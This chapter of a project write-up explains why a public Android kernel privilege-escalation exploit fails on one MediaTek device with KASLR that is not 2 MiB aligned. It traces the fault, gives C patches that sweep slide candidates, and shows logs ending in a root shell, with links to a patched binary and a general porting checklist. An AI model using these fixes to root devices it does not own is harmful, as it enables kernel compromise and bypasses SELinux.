# 09 · ★★ Root Cause: a "KASLR must be 2MiB aligned" assumption

[中文](../09-root-cause.md) · **English**

> **This is the most valuable chapter of the project.**
> One implicit assumption makes the published source fail 100% of the time on a particular
> device, while the upstream binary succeeds.
> If you are porting someone else's kernel exploit, this chapter will very likely help you
> locate the problem.
>
> 📌 **Reported upstream**: [kpgc10kai/Shark#6](https://github.com/kpgc10kai/Shark/issues/6)
> — minimal patch, file:line locations, and a cheaper way to derive the offset than
> sweeping four candidates.

---

## 1. Symptom

### 1.1 The upstream binary works; source-compiled does not

We compiled the exploit from [kpgc10kai/Shark](https://github.com/kpgc10kai/Shark)
(fork of upstream v2.3.2) and ran it on the same device:

```
PROBE_KERNEL=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROFILE_66118=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROBE_TRACE=yes
PROBE_OK
[+] pid=17543 cpu=2
[ids] page_alloc=275 page_free=273 pairs=1029 votes=1026
[calib] timers=0                                     <- zero
[base] made=512 timers=0 pages=15 best=0 count=0
[-] base calibration failed
```

**But the binary extracted from the upstream APK (v2.5.1) reports `timers=512`:**

```
[calib] timers=512
[base] made=512 timers=512 pages=15 best=0xffffff7fc0000000 count=202
```

**⇒ source and binary disagree ⇒ upstream changed code without pushing it back to source.**

### 1.2 Even stranger: cred works but task does not

Later, running `--auto`:

```
[cred] attempt=0 child=15733 R=0xffffff810c664e40 hello=0x52445931 recs=1 task=0 task_recs=0 failed
[cred] attempt=1 child=15734 R=0xffffff810c664900 hello=0x52445931 recs=1 task=0 task_recs=0 failed
[cred] attempt=2 child=15735 R=0xffffff810c664c00 hello=0x52445931 recs=1 task=0 task_recs=0 failed
[cred] attempt=3 child=15736 R=0xffffff810c664840 hello=0x52445931 recs=1 task=0 task_recs=0 failed
[-] cred leak failed
```

**`recs=1` (cred found) but `task_recs=0` (task not found).**

Same trace buffer, same scanning loop, same filtering idea — **one works, one does not.
What is different?**

---

## 2. Locating the problem

### 2.1 First, verify "is the constant correct"

The filter in `scan_task_allocs`:

```c
if ((site & 0x1fffffULL) != COPY_PROCESS_LOW21)
    continue;
```

`COPY_PROCESS_LOW21 = 0xab93c`, taken from the profile.

**Is that right per the vmlinux?**

```console
$ python tools/kcalls.py copy_process | grep kmem_cache_alloc
  0xffffffc0800ab938  bl -> kmem_cache_alloc_node+0x0
```

**The `bl` is at `0xab938`, so the return address (`_RET_IP_`) is `0xab93c`.** ✅ **Constant
is correct.**

### 2.2 Second, confirm the event really is in the trace

Enable the tracepoint directly from the shell and inspect the text output:

```console
$ adb shell "echo 1 > /sys/kernel/tracing/events/kmem/kmem_cache_alloc/enable"
$ adb shell "cat /sys/kernel/tracing/trace | grep copy_process"
```

```
sh-17367 [007] .... 3451.640059: kmem_cache_alloc:
    call_site=copy_process+0x140/0x1030
    ptr=00000000f13ff2d1
    bytes_req=4800 bytes_alloc=4800 gfp_flags=GFP_KERNEL
```

**The event is present, and `bytes_alloc=4800` is inside `[0x1000, 0x1a00]`.**

(`ptr` is hashed — that is the `%pK` effect; the raw record contains the real pointer.)

### 2.3 So the only remaining suspect is the low-21-bit comparison

With the event present, the constant correct and the value in range, **the only thing that
can still be wrong is `(site & 0x1fffff)`.**

**Hypothesis: the low 21 bits change at runtime.**

### 2.4 Verify by back-computing from the cred log

`scan_cred_allocs` has `CRED_SITE_LOW21 = 0`, i.e. **the check is skipped**, but it still
prints the measured `site & 0x1fffff`:

```
[cred] ... site_low=0x164064 ...
```

And the **link-time address** of `prepare_creds+0x24` is `0xffffffc0800e4064`.

Computing:

```python
site_low        = 0x164064
link_low21      = 0xe4064
difference      = (0x164064 - 0xe4064) & 0x1fffff
                = 0x80000
```

**The difference is `0x80000` — exactly the mod-2MiB component of the slide.**

And we know the slide from the log:

```
slide=0x2b45280000
slide & 0x1fffff = 0x80000     ✅ exact match
```

**⇒ hypothesis confirmed: the low 21 bits shift with the slide's mod-2MiB component.**

### 2.5 Compute the affected symbols

| Symbol | Link-time low-21 | + slide offset | **Runtime low-21** | Compared against | Result |
|---|---|---|---|---|---|
| `do_timer_create+0xa8` | `0x195d48` | +`0x80000` | **`0x15d48`** | `0x195d48` | ❌ |
| `copy_process+0x140` | `0x0ab93c` | +`0x80000` | **`0x12b93c`** | `0xab93c` | ❌ |
| `prepare_creds+0x24` | `0xe4064` | +`0x80000` | **`0x164064`** | (0 = unchecked) | ✅ |

**⇒ timer and task both shift and therefore never match; cred works because it is not
checked.**

**That is the complete explanation of "why cred works but task does not".**

---

## 3. Why the upstream author did not notice

Because he wrote a hard precondition into the probe:

```c
nrec = scan_timer_allocs(raw, (size_t)n, getpid(), ptrs, 128, &site0);
...
if (!nrec || !site0 ||
    (site0 & 0x1fffffULL) != (unsigned long long)TIMER_SITE_LOW21) {
    printf("PROBE_TIMER_FAIL\n");
    return 1;
}
g_slide = site0 - STATIC_TIMER_SITE;
printf("PROBE_SLIDE=%#llx aligned=%d\n", g_slide, (g_slide & 0x1fffffULL) == 0);
if (g_slide & 0x1fffffULL)
    return 1;              // bail out if not 2MiB aligned
```

**The machine he validated on had a 2MiB-aligned KASLR (`aligned=1`), so the low 21 bits did
not change and the comparison held.**

**Ours is 512KB aligned (`aligned=0`), so the whole comparison chain is invalid.**

---

## 4. The fix

### 4.1 Key observation: the candidate set is finite, but the granularity is 64 KiB

> ⚠️ **Revision.** This section originally claimed "only 4 candidates". That inference
> was too strong and has been corrected upstream — see
> [kpgc10kai/Shark#6](https://github.com/kpgc10kai/Shark/issues/6).

The arm64 virtual KASLR displacement is a **random multiple of 2 MiB plus the physical
placement modulo 2 MiB**. That remainder is not necessarily a multiple of 512 KB — it is
only constrained by module alignment, typically **64 KiB**.

So the correct granularity is **64 KiB, 32 candidates**:

```
0x00000 / 0x10000 / 0x20000 / ... / 0x1f0000
```

The 4 values we originally used, `{0, 0x80000, 0x100000, 0x180000}`, happen to be
entries **0 / 8 / 16 / 24** of that sequence — **enough for the machine we had, not enough
for every physical placement.** The 32-candidate set is a strict superset.

### 4.2 Patch 1: add a global adjustment

```c
/* the mod-2MiB component of the KASLR slide */
static unsigned long long g_low_adj = 0ULL;
```

### 4.3 Patch 2: add it to every low-21 comparison

```c
/* before */
if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
    continue;

/* after */
if ((site & 0x1fffffULL) != ((TIMER_SITE_LOW21 + g_low_adj) & 0x1fffffULL))
    continue;
```

(3 sites total: timer ×2, task ×1.)

### 4.4 Patch 3: sweep 32 candidates at 64 KiB granularity during calibration

```c
{
    int c = 0;
    int best_ci = 0;

    for (int ci = 0; ci < 32; ci++) {
        int cc;

        g_low_adj = (unsigned long long)ci * 0x10000ULL;
        cc = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
        if (cc > c) { c = cc; best_ci = ci; }
        if (c >= 512) break;      /* 512 is the scan cap: cannot do better */
    }
    g_low_adj = (unsigned long long)best_ci * 0x10000ULL;
    /* recollect with the final value so ptrs[] is filled correctly */
    c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
}
```

It stops early once the hit count reaches the scan cap, so in practice it runs 9 scans
(`0x80000` is entry 9 of the sequence).

Artifacts: `artifacts/shark-k66118-32cand`, `artifacts/plant_core.patched.32cand.inc`,
`artifacts/make32.py`.

The probe path gets the same treatment.

### 4.5 Patch 4: delete the hard 2MiB alignment check entirely

```c
/* before */
if (g_slide & 0x1fffffULL)
    return 1;

/* after: deleted */
```

> ⚠️ **Our first attempt only relaxed it to `&& (g_slide & 0x7ffffULL)` — that was wrong.**
> It still demands 512 KB alignment, so it rejects a legitimate 64 KiB-aligned slide:
> the new sweep finds the correct `low_adj` and the very next line gives up.
> This only becomes visible once the granularity moves from 512 KB to 64 KiB.

---

## 5. Effect of the fix

### 5.1 The probe passes immediately

```
PROBE_TIMER made=128 recs=128 site=0xffffffebc5415d48 low_adj=0x80000
PROBE_SLIDE=0x2b45280000 aligned=0
[calib] timers=512 low_adj=0x80000
[base] made=512 timers=512 pages=21 best=0xffffff7fc0000000 count=330
[cred] attempt=0 child=18236 R=0xffffff80c117a180 site_low=0x164064 recs=1
       task=0xffffff807a40cb00 task_recs=1            <- 0 -> 1
PROBE_TASK=0xffffff807a40cb00 expected_low21=0xab93c
PROBE_CRED=0xffffff80c117a180 req=0xb8 alloc=0xc0 uid_off=0x8
PROBE_OK
```

**`low_adj=0x80000` is detected correctly and `task_recs` goes from 0 to 1.**

### 5.2 The full chain completes

```
[+] stage fake_cred  ... burst hit=1 after 48ms
[+] stage selinux    ... burst hit=1 after 132ms
[+] stage fake_uid   ... burst hit=1 after 103ms
[+] child report stage=2 uid=0 euid=0 resuid=0/0/0
LATE_LOAD_RC=0
```

### 5.3 Final result

```console
$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```

---

## 6. Patch files

- [`artifacts/plant_core.patched.inc`](../../artifacts/plant_core.patched.inc) — the complete patched source
- [`artifacts/patch_shark_low21.py`](../../artifacts/patch_shark_low21.py) — a replayable patch script
- [`artifacts/shark-k66118-fixed`](../../artifacts/shark-k66118-fixed) — the compiled aarch64 binary

**Using the patch script:**

```bash
cp plant_core.inc plant_core.orig.inc
python patch_shark_low21.py
# then apply the global variable and the two probe-path changes manually
# (see 4.2 / 4.4 / 4.5)
```

---

## 7. Generality of this lesson

### 7.1 Where the number "low 21 bits" comes from

`0x1fffff` = 2MiB - 1.

Kernel exploits use it because they **assume KASLR is 2MiB aligned**, so
"low 21 bits of the link address" equals "low 21 bits of the runtime address" and a symbol
can be matched *without knowing the slide first*.

**That assumption holds on many ARM64 devices, but not all.**

### 7.2 When it does not hold

| Case | What we actually observed |
|---|---|
| Normal (2 MiB aligned) | `slide & 0x1fffff == 0`; the original code works |
| Our device (MT8786 + 6.6.118 android15-8 + 4K pages) | `slide = 0x2b45280000`, `& 0x1fffff = 0x80000` |
| popsicle (Xiaomi 17 Pro Max + 6.12.69) | 2 MiB aligned |

> ⚠️ **`0x80000` is the value we measured on one boot, not a constant of this device.**
> The displacement includes the physical-placement remainder, so it can change across boots
> or firmware updates. That is exactly why the sweep covers 32 candidates instead of
> hardcoding one value.

### 7.3 Checklist when porting any kernel exploit

```
1. Never assume the runtime low 21 bits equal the link-time low 21 bits
   -> first compute slide & 0x1fffff and see if it is zero

2. If the source contains xxx_LOW21 constants,
   change every one to (LOW21 + (slide & 0x1fffff)) & 0x1fffff

3. If the source contains checks like `if (slide & 0x1fffff) return fail;`,
   that is the author's assumption on his own machine and must be relaxed

4. Use the unchecked path (e.g. cred) to back-compute the slide offset
   -- it is an excellent self-calibration anchor
```

### 7.4 How we found it (a reusable thought process)

```
Symptom: A works, B does not, both using the same logic
 |
Rule out: is the constant right? (disassembly -> yes)
Rule out: is the event there?  (enable the tracepoint, read text -> yes)
 |
Only remaining variable: the low-21 comparison
 |
Verify: find a path that does NOT check low 21 bits (cred),
        see how far its measured value is from the link address
 |
Difference = 0x80000 = slide mod 2MiB   ✅ confirmed
```

**The trick of "find an unfiltered side channel to back-compute the offset" is extremely
useful.**

---

## 8. One-sentence summary

> **KASLR alignment granularity is a device property, not a constant.**
> **Any code that compares a bit-slice of a link-time address against a bit-slice of a
> runtime address must first compensate for the corresponding component of the slide.**
